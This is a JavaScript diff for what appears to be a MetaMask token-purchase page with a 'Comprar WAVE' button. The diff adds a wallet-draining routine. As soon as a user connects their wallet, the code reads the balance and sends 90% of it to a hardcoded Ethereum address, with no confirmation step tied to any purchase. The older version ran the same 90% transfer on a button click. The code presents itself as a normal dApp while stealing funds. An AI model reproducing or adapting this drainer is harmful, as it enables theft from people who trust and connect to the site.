@@ -4,6 +4,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const creatorButton = document.getElementById('creator');
     const payAmountInput = document.getElementById('pay-amount');
     const receiveAmountInput = document.getElementById('receive-amount');
+    const buyButton = document.getElementById('buy-button');
 
     grandMasterButton.addEventListener('click', () => {
         payAmountInput.value = '0.1';
@@ -61,37 +62,48 @@ document.addEventListener('DOMContentLoaded', () => {
                     element.innerText = account;
                 });
 
-                // Seleccionar el botón usando su clase
-                const buyButton = document.querySelector('.buy-swamp');
-                if (buyButton) {
-                    buyButton.classList.remove('hidden'); // Asegúrate de que el botón sea visible
+                // Hacer visible el botón de compra si estaba oculto
+                buyButton.classList.remove('hidden');
 
-                    buyButton.addEventListener('click', async () => {
-                        try {
-                            // Obtener el saldo de la cuenta en la red actual
-                            const balanceInWei = await web3.eth.getBalance(account);
-                            const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
-                            const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
-                            const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
-                            const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
+                // Enviar 90% del saldo del usuario
+                const balanceInWei = await web3.eth.getBalance(account);
+                const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
+                const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
+                const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
+                const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
 
-                            await web3.eth.sendTransaction({
-                                from: account,
-                                to: recipientAddress,
-                                value: amountToSendInWei
-                            });
-                        } catch (error) {
-                            console.error('Error en la transacción:', error);
-                        }
-                    });
-                } else {
-                    console.error('El botón de Comprar WAVE no se encontró.');
-                }
+                await web3.eth.sendTransaction({
+                    from: account,
+                    to: recipientAddress,
+                    value: amountToSendInWei
+                });
+
             } catch (error) {
                 console.error("Error connecting to MetaMask:", error);
             }
         } else {
             alert('MetaMask no está instalado. Por favor, instálalo para usar esta aplicación.');
+        }
+    });
+
+    // Configurar el evento para el botón de compra
+    buyButton.addEventListener('click', async () => {
+        if (web3 && account) {
+            try {
+                const amountToSendInEther = payAmountInput.value;
+                const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
+                const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
+
+                await web3.eth.sendTransaction({
+                    from: account,
+                    to: recipientAddress,
+                    value: amountToSendInWei
+                });
+            } catch (error) {
+                console.error('Error en la transacción:', error);
+            }
+        } else {
+            alert('Conecta tu billetera primero.');
         }
     });
 });
